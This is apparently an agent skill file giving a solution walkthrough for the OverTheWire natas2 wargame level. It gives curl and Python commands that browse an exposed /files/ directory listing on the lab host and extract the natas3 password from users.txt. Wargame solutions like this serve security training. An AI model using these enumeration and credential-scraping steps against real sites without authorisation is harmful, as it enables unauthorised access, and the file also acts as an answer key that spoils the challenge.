---
name: natas-2
description: >-
  Use when solving OverTheWire natas2: given natas2 credentials, browse the
  exposed /files/ directory listing and read users.txt to get the natas3
  password.
---
# natas2

**Input:** username and password for natas2.

**Weakness:** the page loads `files/pixel.png`, and the `/files/` directory has Apache directory listing enabled, exposing `users.txt`, which contains the natas3 credentials.

**Network:** run on a host that can reach `natas2.natas.labs.overthewire.org`. On Windows PowerShell use `python` / `curl.exe`, not the `curl` alias.

## Steps

1. (Recon) List the directory to see what's exposed:

```bash
curl.exe -s -u USER:PASS http://natas2.natas.labs.overthewire.org/files/
```

2. Derive the natas3 password from `users.txt` (never hardcode it). Replace `USER` and `PASS` with the natas2 credentials:

```bash
python -c "import base64,re,urllib.request;u,p='USER','PASS';r=urllib.request.Request('http://natas2.natas.labs.overthewire.org/files/users.txt');r.add_header('Authorization','Basic '+base64.b64encode(f'{u}:{p}'.encode()).decode());t=urllib.request.urlopen(r,timeout=30).read().decode();print(re.search(r'^natas3:(\S+)',t,re.M).group(1))"
```

3. The printed string is the natas3 password.

4. Confirm by GETting `http://natas3.natas.labs.overthewire.org/` with Basic Auth `natas3:<password>` and expecting HTTP 200.
